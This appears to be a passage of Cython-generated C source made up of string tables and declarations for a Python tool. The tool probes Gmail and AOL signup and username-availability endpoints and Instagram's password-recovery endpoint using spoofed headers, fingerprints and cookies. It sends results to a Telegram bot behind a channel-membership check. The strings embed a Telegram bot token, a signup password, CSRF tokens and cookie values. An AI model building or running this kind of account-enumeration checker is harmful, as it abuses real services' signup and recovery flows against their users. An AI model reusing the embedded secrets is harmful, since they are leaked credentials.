static const char __pyx_k_1m_36m[] = "\033[1m\033[36m";
static const char __pyx_k_1m_37m[] = "\033[1m\033[37m";
static const char __pyx_k_2011_2[] = "2011 ";
static const char __pyx_k_3brTvw[] = "3brTvw==";
static const char __pyx_k_BRIGHT[] = "BRIGHT";
static const char __pyx_k_Cookie[] = "Cookie";
static const char __pyx_k_Getaol[] = "Getaol";
static const char __pyx_k_Thread[] = "Thread";
static const char __pyx_k_YELLOW[] = "YELLOW";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_acrumb[] = "acrumb";
static const char __pyx_k_cfonts[] = "cfonts";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_digits[] = "digits";
static const char __pyx_k_doc_id[] = "doc_id";
static const char __pyx_k_emails[] = "emails";
static const char __pyx_k_errors[] = "{\"errors\":[]}";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_goodig[] = "goodig";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_main_2[] = "main";
static const char __pyx_k_member[] = "member";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_orange[] = "orange";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_output[] = "output";
static const char __pyx_k_params[] = "params";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_ranges[] = "ranges";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_render[] = "render";
static const char __pyx_k_result[] = "result";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_specId[] = "specId";
static const char __pyx_k_status[] = "status";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_string[] = "string";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_target[] = "target";
static const char __pyx_k_text_2[] = "&text=";
static const char __pyx_k_tl_txt[] = "tl.txt";
static const char __pyx_k_update[] = "update";
static const char __pyx_k_userId[] = "userId";
static const char __pyx_k_yellow[] = "yellow";
static const char __pyx_k_Console[] = "Console";
static const char __pyx_k_InfoAcc[] = "InfoAcc";
static const char __pyx_k_PROFILE[] = "PROFILE";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_Windows[] = "\"Windows\"";
static const char __pyx_k_android[] = "android-";
static const char __pyx_k_aol_com[] = "@aol.com";
static const char __pyx_k_chat_id[] = "chat_id";
static const char __pyx_k_choices[] = "choices";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_creator[] = "creator";
static const char __pyx_k_genexpr[] = "genexpr";
static const char __pyx_k_getChat[] = "/getChat";
static const char __pyx_k_gpp_sid[] = "gpp_sid";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_j_0_u_1[] = "&j=0&u=1---";
static const char __pyx_k_magenta[] = "magenta";
static const char __pyx_k_no_REST[] = "no REST !";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_session[] = "session";
static const char __pyx_k_user_id[] = "user_id";
static const char __pyx_k_22_2C_22[] = "%22%2C%22";
static const char __pyx_k_X_FB_LSD[] = "X-FB-LSD";
static const char __pyx_k_acrumb_2[] = "&acrumb=";
static const char __pyx_k_bademail[] = "bademail";
static const char __pyx_k_badinsta[] = "badinsta";
static const char __pyx_k_colorama[] = "colorama";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_gf_uar_1[] = "\"gf.uar\",1";
static const char __pyx_k_isPraise[] = "isPraise";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_response[] = "response";
static const char __pyx_k_specData[] = "specData";
static const char __pyx_k_username[] = "username";
static const char __pyx_k_38_5_202m[] = "\033[38;5;202m";
static const char __pyx_k_38_5_203m[] = "\033[38;5;203m";
static const char __pyx_k_38_5_208m[] = "\033[38;5;208m";
static const char __pyx_k_BOT_TOKEN[] = "BOT_TOKEN";
static const char __pyx_k_Host_GAPS[] = "__Host-GAPS";
static const char __pyx_k_RESET_ALL[] = "RESET_ALL";
static const char __pyx_k_Ruler_txt[] = "Ruler.txt";
static const char __pyx_k_authority[] = "authority";
static const char __pyx_k_autoreset[] = "autoreset";
static const char __pyx_k_biography[] = "biography";
static const char __pyx_k_check_aol[] = "check_aol";
static const char __pyx_k_csrftoken[] = "_csrftoken";
static const char __pyx_k_device_id[] = "device_id";
static const char __pyx_k_full_name[] = "full_name";
static const char __pyx_k_gmail_com[] = "@gmail.com";
static const char __pyx_k_hexdigest[] = "hexdigest";
static const char __pyx_k_infoinsta[] = "infoinsta";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_threading[] = "threading";
static const char __pyx_k_user_id_2[] = "&user_id=";
static const char __pyx_k_user_info[] = "user_info";
static const char __pyx_k_variables[] = "variables";
static const char __pyx_k_xYourKing[] = "xYourKing";
static const char __pyx_k_CHANNEL_ID[] = "CHANNEL_ID";
static const char __pyx_k_Connection[] = "Connection";
static const char __pyx_k_User_Agent[] = "User-Agent";
static const char __pyx_k_deviceinfo[] = "deviceinfo";
static const char __pyx_k_first_name[] = "first_name";
static const char __pyx_k_is_private[] = "is_private";
static const char __pyx_k_keep_alive[] = "keep-alive";
static const char __pyx_k_name_crumb[] = "\" name=\"crumb\">";
static const char __pyx_k_rich_table[] = "rich.table";
static const char __pyx_k_splitlines[] = "splitlines";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_E_Y_Us_Ws_W[] = " \360\237\224\264 E\312\200\312\200\341\264\217\312\200 : Y\341\264\217\341\264\234\312\200 Us\341\264\207\312\200 \311\252\341\264\205 W\341\264\200s W\312\200\341\264\217\311\264\311\242   ";
static const char __pyx_k_X_IG_App_ID[] = "X-IG-App-ID";
static const char __pyx_k_aol_cok_txt[] = "aol_cok.txt";
static const char __pyx_k_aol_req_txt[] = "aol_req.txt";
static const char __pyx_k_check_gmail[] = "check_gmail";
static const char __pyx_k_csrftoken_2[] = "csrftoken";
static const char __pyx_k_en_GB_en_US[] = "en-GB, en-US";
static const char __pyx_k_is_business[] = "is_business";
static const char __pyx_k_is_verified[] = "is_verified";
static const char __pyx_k_media_count[] = "media_count";
static const char __pyx_k_name_acrumb[] = "\" name=\"acrumb\">";
static const char __pyx_k_name_specId[] = "\" name=\"specId\">";
static const char __pyx_k_same_origin[] = "same-origin";
static const char __pyx_k_signed_body[] = "signed_body";
static const char __pyx_k_status_code[] = "status_code";
static const char __pyx_k_1m_38_5_208m[] = "\033[1m\033[38;5;208m";
static const char __pyx_k_Content_Type[] = "Content-Type";
static const char __pyx_k_RulerHuPagal[] = "\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\n\360\235\227\225\360\235\227\254 : @RulerHuPagal ";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_get_bot_info[] = "get_bot_info";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_rich_console[] = "rich.console";
static const char __pyx_k_sessionIndex[] = "sessionIndex";
static const char __pyx_k_user_agent_2[] = "user_agent";
static const char __pyx_k_1002007995166[] = "-1002007995166";
static const char __pyx_k_BaseException[] = "BaseException";
static const char __pyx_k_administrator[] = "administrator";
static const char __pyx_k_ascii_letters[] = "ascii_letters";
static const char __pyx_k_get_user_info[] = "get_user_info";
static const char __pyx_k_loading_chars[] = "loading_chars";
static const char __pyx_k_login_aol_com[] = "login.aol.com";
static const char __pyx_k_name_specData[] = "\" name=\"specData\">";
static const char __pyx_k_validateField[] = "validateField";
static const char __pyx_k_1700251574_982[] = "1700251574.982";
static const char __pyx_k_Content_Length[] = "Content-Length";
static const char __pyx_k_XMLHttpRequest[] = "XMLHttpRequest";
static const char __pyx_k_en_US_en_q_0_9[] = "en-US,en;q=0.9";
static const char __pyx_k_follower_count[] = "follower_count";
static const char __pyx_k_render_surface[] = "render_surface";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_sessionIndex_2[] = "&sessionIndex=";
static const char __pyx_k_567067343352427[] = "567067343352427";
static const char __pyx_k_Accept_Encoding[] = "Accept-Encoding";
static const char __pyx_k_Accept_Language[] = "Accept-Language";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_following_count[] = "following_count";
static const char __pyx_k_i_instagram_com[] = "i.instagram.com";
static const char __pyx_k_X_FB_HTTP_Engine[] = "X-FB-HTTP-Engine";
static const char __pyx_k_sec_ch_ua_mobile[] = "sec-ch-ua-mobile";
static const char __pyx_k_x_requested_with[] = "x-requested-with";
static const char __pyx_k_25618261841150840[] = "25618261841150840";
static const char __pyx_k_X_IG_Capabilities[] = "X-IG-Capabilities";
static const char __pyx_k_cacheStored_crumb[] = "&cacheStored=&crumb=";
static const char __pyx_k_loading_animation[] = "loading_animation";
static const char __pyx_k_name_sessionIndex[] = "\" name=\"sessionIndex\">";
static const char __pyx_k_X_Bloks_Version_Id[] = "X-Bloks-Version-Id";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_ig_sig_key_version[] = "ig_sig_key_version";
static const char __pyx_k_is_user_in_channel[] = "is_user_in_channel";
static const char __pyx_k_sec_ch_ua_platform[] = "sec-ch-ua-platform";
static const char __pyx_k_tll_locals_genexpr[] = "tll.<locals>.genexpr";
static const char __pyx_k_X_Pigeon_Session_Id[] = "X-Pigeon-Session-Id";
static const char __pyx_k_accounts_google_com[] = "accounts.google.com";
static const char __pyx_k_generate_user_agent[] = "generate_user_agent";
static const char __pyx_k_https_login_aol_com[] = "https://login.aol.com";
static const char __pyx_k_sendMessage_chat_id[] = "/sendMessage?chat_id=";
static const char __pyx_k_X_IG_Connection_Type[] = "X-IG-Connection-Type";
static const char __pyx_k_google_accounts_xsrf[] = "google-accounts-xsrf";
static const char __pyx_k_pip_install_colorama[] = "pip install colorama";
static const char __pyx_k_E_B_T_Ws_W_Ps_C_Y_B_T[] = "  \360\237\224\264  E\312\200\312\200\341\264\217\312\200 : B\341\264\217\341\264\233 T\341\264\217\341\264\213\341\264\207\311\264 W\341\264\200s W\312\200\341\264\217\311\264\311\242 [ P\312\237\341\264\207\341\264\200s\341\264\207 C\312\234\341\264\207\341\264\204\341\264\213 Y\341\264\217\341\264\234\312\200 B\341\264\217\341\264\233 T\341\264\217\341\264\213\341\264\207\311\264 ]";
static const char __pyx_k_ID_c0M0fd00676f0ea1_T[] = "ID=c0M0fd00676f0ea1:T=";
static const char __pyx_k_X_IG_Connection_Speed[] = "X-IG-Connection-Speed";
static const char __pyx_k_getChatMember_chat_id[] = "/getChatMember?chat_id=";
static const char __pyx_k_1_32m_Enter_Your_ID_0m[] = "\n\033[1;32m> Enter Your ID\033[0m ";
static const char __pyx_k_UID_00000cf0e8904e94_T[] = "UID=00000cf0e8904e94:T=";
static const char __pyx_k_X_Pigeon_Rawclienttime[] = "X-Pigeon-Rawclienttime";
static const char __pyx_k_No_first_name_available[] = "No first name available";
static const char __pyx_k_https_www_instagram_com[] = "\n\360\235\227\237\360\235\227\234\360\235\227\241\360\235\227\236 - https://www.instagram.com/";
static const char __pyx_k_X_IG_Bandwidth_Speed_KBPS[] = "X-IG-Bandwidth-Speed-KBPS";
static const char __pyx_k_https_accounts_google_com[] = "https://accounts.google.com";
static const char __pyx_k_pip_install_python_cfonts[] = "pip install python-cfonts";
static const char __pyx_k_azertyuiopmlkjhgfdsqwxcvbn[] = "azertyuiopmlkjhgfdsqwxcvbn";
static const char __pyx_k_https_api_telegram_org_bot[] = "https://api.telegram.org/bot";
static const char __pyx_k_X_IG_Bandwidth_TotalBytes_B[] = "X-IG-Bandwidth-TotalBytes-B";
static const char __pyx_k_X_IG_Bandwidth_TotalTime_MS[] = "X-IG-Bandwidth-TotalTime-MS";
static const char __pyx_k_1_32m_Enter_Your_Bot_Token_0m[] = "\033[1;32m> Enter Your Bot Token: \033[0m ";
static const char __pyx_k_Not_A_Brand_v_8_Chromium_v_120[] = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"";
static const char __pyx_k_acrumb_input_type_hidden_value[] = "\"acrumb\">\n        <input type=\"hidden\" value=\"";
static const char __pyx_k_done_https_3A_2F_2Fwww_aol_com[] = "&done=https%3A%2F%2Fwww.aol.com";
static const char __pyx_k_0_0_null_null_web_glif_signup_0[] = "\",0,0,null,null,\"web-glif-signup\",0,null,1,[],1]";
static const char __pyx_k_22_2C0_2C0_2C1_2Cnull_2C0_2C516[] = "%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";
static const char __pyx_k_Access_granted_Running_the_scri[] = "\n\342\234\205 Access granted! Running the script...";
static const char __pyx_k_S_ALNI_MYCzPrYn9967HtpDSITUe5Z4[] = ":S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ";
static const char __pyx_k_S_ALNI_MaEGaVTSG6nQFkSJ_RnxSZrF[] = ":S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA";
static const char __pyx_k_You_must_join_the_channel_to_us[] = "\342\235\214 You must join the channel to use this script!";
static const char __pyx_k_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q[] = "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6";
static const char __pyx_k_multiDomain_tos0_oath_freereg_7[] = "&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId=";
static const char __pyx_k_name_browser_fp_data_id_browser[] = "name=\"browser-fp-data\" id=\"browser-fp-data\" value=\"\" />\n        <input type=\"hidden\" value=\"";
static const char __pyx_k_null_null_null_null_null_NL_nul[] = "[null,null,null,null,null,\"NL\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,2,null,0,1,\"\",null,null,2,2]";
static const char __pyx_k_password_Drahmed2006_mm_10_dd_2[] = "&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup=";
static const char __pyx_k_0d067c2f86cac2c17d655631c9cec240[] = "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.";
static const char __pyx_k_50cc6861_7036_43b4_802e_fb428279[] = "50cc6861-7036-43b4-802e-fb4282799c60";
static const char __pyx_k_8097986746_AAEPTusdQzwA_EQZtjLRH[] = "8097986746:AAEPTusdQzwA_EQZtjLRHydRfXIGPzq6bNo";
static const char __pyx_k_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj[] = "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj";
static const char __pyx_k_Error_Could_not_retrieve_bot_inf[] = "Error: Could not retrieve bot information.";
static const char __pyx_k_Error_Could_not_retrieve_user_in[] = "Error: Could not retrieve user information.";
static const char __pyx_k_Instagram_100_0_0_17_129_Android[] = "Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
static const char __pyx_k_Please_type_the_number_of_your_c[] = "Please type the number of your choice: ";
static const char __pyx_k_User_does_not_have_a_username_Do[] = "User does not have a username. Don't Worry About it ";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded;charset=UTF-8";
static const char __pyx_k_browser_fp_data_7B_22language_22[] = "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId=";
static const char __pyx_k_c80c5fb30dfae9e273e4009f03b18280[] = "c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0";
static const char __pyx_k_continue_https_3A_2F_2Fmail_goog[] = "continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A";
static const char __pyx_k_data_initial_setup_data_null_nul[] = "data-initial-setup-data=\"%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&";
static const char __pyx_k_done_https_3A_2F_2Fwww_aol_com_2[] = "&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData=";
static const char __pyx_k_https_accounts_google_com___sign[] = "https://accounts.google.com/_/signup/validatepersonaldetails";
static const char __pyx_k_https_accounts_google_com_signin[] = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB";
static const char __pyx_k_https_accounts_google_com_signup[] = "https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn";
static const char __pyx_k_https_i_instagram_com_api_v1_acc[] = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/";
static const char __pyx_k_https_login_aol_com_account_crea[] = "https://login.aol.com/account/create";
static const char __pyx_k_https_login_aol_com_account_modu[] = "https://login.aol.com/account/module/create";
static const char __pyx_k_https_www_instagram_com_accounts[] = "https://www.instagram.com/accounts/login";
static const char __pyx_k_https_www_instagram_com_api_grap[] = "https://www.instagram.com/api/graphql";
static const char __pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP[] = "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj";
static const char __pyx_k_name_attrSetIndex_input_type_hid[] = "name=\"attrSetIndex\">\n        <input type=\"hidden\" value=\"";
static const char __pyx_k_name_cacheStored_input_type_hidd[] = "name=\"cacheStored\">\n        <input type=\"hidden\" value=\"";
static const char __pyx_k_name_crumb_input_type_hidden_val[] = "name=\"crumb\">\n        <input type=\"hidden\" value=\"";
static const char __pyx_k_0d067c2f86cac2c17d655631c9cec240_2[] = "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{\"_csrftoken\":\"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj\",\"adid\":\"0dfaf820-2748-4634-9365-c3d8c8011256\",\"guid\":\"1f784431-2663-4db9-b624-86bd9ce1d084\",\"device_id\":\"android-b93ddb37e983481c\",\"query\":\"";
static const char __pyx_k_application_x_www_form_urlencode_2[] = "application/x-www-form-urlencoded; charset=UTF-8";
static const char __pyx_k_https_accounts_google_com___sign_2[] = "https://accounts.google.com/_/signup/usernameavailability";
static const char __pyx_k_https_accounts_google_com_signup_2[] = "https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL=";
static const char __pyx_k_https_login_aol_com_account_crea_2[] = "https://login.aol.com/account/create?specId=";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_kp_u_0;
static PyObject *__pyx_kp_u_0_0_null_null_web_glif_signup_0;
static PyObject *__pyx_kp_u_0_2;
static PyObject *__pyx_kp_u_0_3;
static PyObject *__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240;
static PyObject *__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2;
static PyObject *__pyx_kp_u_0m;
static PyObject *__pyx_kp_u_1;
static PyObject *__pyx_kp_u_1002007995166;
static PyObject *__pyx_kp_u_1700251574_982;
static PyObject *__pyx_kp_u_1_000;
static PyObject *__pyx_kp_u_1_2;
static PyObject *__pyx_kp_u_1_30m;
static PyObject *__pyx_kp_u_1_31m;
static PyObject *__pyx_kp_u_1_32m;
static PyObject *__pyx_kp_u_1_32m_Enter_Your_Bot_Token_0m;
static PyObject *__pyx_kp_u_1_32m_Enter_Your_ID_0m;
static PyObject *__pyx_kp_u_1_33m;
static PyObject *__pyx_kp_u_1_34m;
static PyObject *__pyx_kp_u_1_91m;
static PyObject *__pyx_kp_u_1_95m;
static PyObject *__pyx_kp_u_1_96m;
static PyObject *__pyx_kp_u_1_97m;
static PyObject *__pyx_kp_u_1kbps;
static PyObject *__pyx_kp_u_1m_31m;
static PyObject *__pyx_kp_u_1m_32m;
static PyObject *__pyx_kp_u_1m_33m;
static PyObject *__pyx_kp_u_1m_34m;
static PyObject *__pyx_kp_u_1m_35m;
static PyObject *__pyx_kp_u_1m_36m;
static PyObject *__pyx_kp_u_1m_37m;
static PyObject *__pyx_kp_u_1m_38_5_208m;
static PyObject *__pyx_kp_u_2;
static PyObject *__pyx_kp_u_2011;
static PyObject *__pyx_kp_u_2011_2;
static PyObject *__pyx_kp_u_2012;
static PyObject *__pyx_kp_u_2023;
static PyObject *__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516;
static PyObject *__pyx_kp_u_22_2C_22;
static PyObject *__pyx_kp_u_25618261841150840;
static PyObject *__pyx_kp_u_2_32m;
static PyObject *__pyx_kp_u_2_35m;
static PyObject *__pyx_kp_u_2_36m;
static PyObject *__pyx_kp_u_2_39m;
static PyObject *__pyx_kp_u_356;
static PyObject *__pyx_kp_u_38_5;
static PyObject *__pyx_kp_u_38_5_202m;
static PyObject *__pyx_kp_u_38_5_203m;
static PyObject *__pyx_kp_u_38_5_208m;
static PyObject *__pyx_kp_u_3brTvw;
static PyObject *__pyx_kp_u_4;
static PyObject *__pyx_kp_u_50cc6861_7036_43b4_802e_fb428279;
static PyObject *__pyx_kp_u_567067343352427;
static PyObject *__pyx_kp_u_8097986746_AAEPTusdQzwA_EQZtjLRH;
static PyObject *__pyx_kp_u_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj;
static PyObject *__pyx_kp_u_Accept_Encoding;
static PyObject *__pyx_kp_u_Accept_Language;
static PyObject *__pyx_kp_u_Access_granted_Running_the_scri;
static PyObject *__pyx_n_s_B;
static PyObject *__pyx_n_s_B6;
static PyObject *__pyx_n_s_BOLD;
static PyObject *__pyx_n_s_BOT_TOKEN;
static PyObject *__pyx_n_s_BRIGHT;
static PyObject *__pyx_kp_u_B_N;
static PyObject *__pyx_kp_u_B_Us;
static PyObject *__pyx_n_s_BaseException;
static PyObject *__pyx_n_s_C;
static PyObject *__pyx_n_s_CHANNEL_ID;
static PyObject *__pyx_n_s_CYAN;
static PyObject *__pyx_n_u_Connection;
static PyObject *__pyx_n_s_Console;
static PyObject *__pyx_kp_u_Content_Length;
static PyObject *__pyx_kp_u_Content_Type;
static PyObject *__pyx_n_u_Cookie;
static PyObject *__pyx_n_u_DBAA;
static PyObject *__pyx_n_s_DP6;
static PyObject *__pyx_n_s_DY6;
static PyObject *__pyx_kp_u_E_B_T_Ws_W_Ps_C_Y_B_T;
static PyObject *__pyx_kp_u_E_Y_Us_Ws_W;
static PyObject *__pyx_kp_u_Error;
static PyObject *__pyx_kp_u_Error_Could_not_retrieve_bot_inf;
static PyObject *__pyx_kp_u_Error_Could_not_retrieve_user_in;
static PyObject *__pyx_n_s_F;
static PyObject *__pyx_n_u_False;
static PyObject *__pyx_n_s_Fore;
static PyObject *__pyx_n_s_G;
static PyObject *__pyx_n_s_G6;
static PyObject *__pyx_n_s_GREEN;
static PyObject *__pyx_n_s_Getaol;
static PyObject *__pyx_n_u_Host;
static PyObject *__pyx_kp_u_Host_GAPS;
static PyObject *__pyx_n_s_ID;
static PyObject *__pyx_kp_u_ID_c0M0fd00676f0ea1_T;
static PyObject *__pyx_n_s_Id;
static PyObject *__pyx_n_s_InfoAcc;
static PyObject *__pyx_kp_u_Instagram_100_0_0_17_129_Android;
static PyObject *__pyx_kp_u_L;
static PyObject *__pyx_n_s_L6;
static PyObject *__pyx_n_s_L_2;
static PyObject *__pyx_kp_u_L_C;
static PyObject *__pyx_n_u_Liger;
static PyObject *__pyx_n_s_M;
static PyObject *__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6;
static PyObject *__pyx_kp_u_No_first_name_available;
static PyObject *__pyx_kp_u_None;
static PyObject *__pyx_kp_u_Not_A_Brand_v_8_Chromium_v_120;
static PyObject *__pyx_n_s_O;
static PyObject *__pyx_n_s_O6;
static PyObject *__pyx_n_s_P6;
static PyObject *__pyx_n_u_PROFILE;
static PyObject *__pyx_kp_u_Please_type_the_number_of_your_c;
static PyObject *__pyx_kp_u_Ps_W;
static PyObject *__pyx_n_s_R;
static PyObject *__pyx_n_s_RED;
static PyObject *__pyx_n_s_RESET;
static PyObject *__pyx_n_s_RESET_ALL;
static PyObject *__pyx_kp_u_RT;
static PyObject *__pyx_kp_u_RulerHuPagal;
static PyObject *__pyx_kp_u_Ruler_txt;
static PyObject *__pyx_kp_u_S_ALNI_MYCzPrYn9967HtpDSITUe5Z4;
static PyObject *__pyx_kp_u_S_ALNI_MaEGaVTSG6nQFkSJ_RnxSZrF;
static PyObject *__pyx_n_s_Session;
static PyObject *__pyx_n_s_Style;
static PyObject *__pyx_n_u_TL;
static PyObject *__pyx_n_s_Table;
static PyObject *__pyx_n_s_Thread;
static PyObject *__pyx_n_u_True;
static PyObject *__pyx_kp_u_UID_00000cf0e8904e94_T;
static PyObject *__pyx_kp_u_User_Agent;
static PyObject *__pyx_kp_u_User_does_not_have_a_username_Do;
static PyObject *__pyx_n_s_W6;
static PyObject *__pyx_n_s_WHITE;
static PyObject *__pyx_n_u_WIFI;
static PyObject *__pyx_kp_u_Windows;
static PyObject *__pyx_n_s_X;
static PyObject *__pyx_n_u_XMLHttpRequest;
static PyObject *__pyx_kp_u_X_Bloks_Version_Id;
static PyObject *__pyx_kp_u_X_FB_HTTP_Engine;
static PyObject *__pyx_kp_u_X_FB_LSD;
static PyObject *__pyx_kp_u_X_IG_App_ID;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_Speed_KBPS;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalBytes_B;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalTime_MS;
static PyObject *__pyx_kp_u_X_IG_Capabilities;
static PyObject *__pyx_kp_u_X_IG_Connection_Speed;
static PyObject *__pyx_kp_u_X_IG_Connection_Type;
static PyObject *__pyx_kp_u_X_Pigeon_Rawclienttime;
static PyObject *__pyx_kp_u_X_Pigeon_Session_Id;
static PyObject *__pyx_n_s_Y;
static PyObject *__pyx_n_s_Y6;
static PyObject *__pyx_n_s_YELLOW;
static PyObject *__pyx_kp_u_Y_N;
static PyObject *__pyx_kp_u_Y_Us;
static PyObject *__pyx_kp_u_You_must_join_the_channel_to_us;
static PyObject *__pyx_n_s_Z;
static PyObject *__pyx_kp_u__101;
static PyObject *__pyx_kp_u__102;
static PyObject *__pyx_kp_u__103;
static PyObject *__pyx_kp_u__104;
static PyObject *__pyx_kp_u__105;
static PyObject *__pyx_kp_u__106;
static PyObject *__pyx_kp_u__13;
static PyObject *__pyx_kp_u__17;
static PyObject *__pyx_kp_u__18;
static PyObject *__pyx_kp_u__19;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__20;
static PyObject *__pyx_kp_u__24;
static PyObject *__pyx_kp_u__25;
static PyObject *__pyx_kp_u__27;
static PyObject *__pyx_kp_u__28;
static PyObject *__pyx_kp_u__3;
static PyObject *__pyx_kp_u__30;
static PyObject *__pyx_kp_u__32;
static PyObject *__pyx_kp_u__35;
static PyObject *__pyx_n_u__37;
static PyObject *__pyx_kp_u__39;
static PyObject *__pyx_kp_u__4;
static PyObject *__pyx_kp_u__47;
